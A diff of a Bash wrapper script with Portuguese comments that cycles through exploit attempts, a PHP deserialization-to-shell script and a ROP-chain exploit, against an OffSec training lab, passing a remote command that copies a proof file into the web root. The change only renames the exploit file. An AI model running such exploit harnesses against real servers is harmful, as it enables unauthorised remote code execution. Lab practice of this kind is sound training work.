@@ -1,7 +1,7 @@
 #!/bin/bash
 # run_all.sh — tenta todas as abordagens para resolver o lab OffSec
 # 1. php2shell.py (pDestructor, perfil 8.5.11 com sweep htdata)
-# 2. exploit-orig.py (ROP chain, auto-heap bucket)
+# 2. exploit.py (ROP chain, auto-heap bucket)
 #
 # Uso:
 #   ./run_all.sh               → OffSec lab ($IP)
@@ -98,16 +98,16 @@ for HTDATA in "${HTDATA_OFFSETS[@]}"; do
 done
 
 # ============================================================
-# PHASE 2: exploit-orig.py (ROP chain, auto-heap)
+# PHASE 2: exploit.py (ROP chain, auto-heap)
 # ============================================================
 echo ""
-echo -e "${CYAN}── PHASE 2: exploit-orig.py (ROP chain) ──${NC}"
+echo -e "${CYAN}── PHASE 2: exploit.py (ROP chain) ──${NC}"
 echo ""
 
 for ATTEMPT in $(seq 1 10); do
     echo -e "${YELLOW}[exploit-orig]${NC} attempt=$ATTEMPT"
 
-    python3 exploit-orig.py \
+    python3 exploit.py \
       --host "$HOST" \
       --port "$PORT" \
       --rce 'cp /var/www/proof.txt /var/www/html/'
